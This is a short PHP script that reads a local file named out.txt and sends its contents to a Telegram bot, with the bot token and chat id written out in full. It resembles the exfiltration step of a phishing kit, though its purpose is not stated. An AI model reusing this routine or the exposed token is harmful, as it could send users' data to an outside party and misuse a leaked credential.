<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1705424185:AAGr9AH29CGcgtwfGO-mtRrN66w12W1VwXE/sendMessage?chat_id=314061685&text=$msg");
?>